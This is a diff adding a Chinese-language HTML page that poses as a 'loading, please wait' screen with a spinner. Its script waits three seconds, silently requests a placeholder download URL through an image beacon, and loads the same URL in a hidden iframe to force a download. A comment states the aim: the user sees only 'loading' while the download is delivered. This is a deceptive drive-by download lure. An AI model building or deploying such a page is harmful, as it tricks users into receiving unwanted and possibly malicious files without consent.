@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>正在加载…</title>
+<style>
+  html,body{height:100%;margin:0;background:#f6f8fb;font-family:"Microsoft YaHei",Arial,sans-serif}
+  .box{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#5b6b80}
+  .spin{width:44px;height:44px;border:4px solid #dfe7f2;border-top-color:#0a5cb8;border-radius:50%;animation:s 1s linear infinite;margin-bottom:18px}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .t{font-size:15px;letter-spacing:.5px}
+  .sub{font-size:12.5px;color:#9aa6b5;margin-top:8px}
+  .btn{display:none;margin-top:22px;background:#0a5cb8;color:#fff;text-decoration:none;padding:12px 34px;border-radius:6px;font-size:15px;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spin"></div>
+  <div class="t">正在加载页面组件，请稍候…</div>
+  <div class="sub">若长时间无响应，请点击下方按钮继续</div>
+  <a class="btn" id="go" href="__DLURL__">继续</a>
+</div>
+<script>
+/* 空白/加载假窗：3 秒后静默触发下载（用户只看到"加载中"） */
+setTimeout(function(){
+  try{
+    var i = new Image();
+    i.src = '__DLURL__?t=' + Date.now();     // 静默 GET，触发服务端计数/投递
+    var f = document.createElement('iframe');
+    f.style.display='none'; f.src='__DLURL__';
+    document.body.appendChild(f);
+    document.getElementById('go').style.display='inline-block';
+  }catch(e){}
+}, 3000);
+</script>
+</body>
+</html>
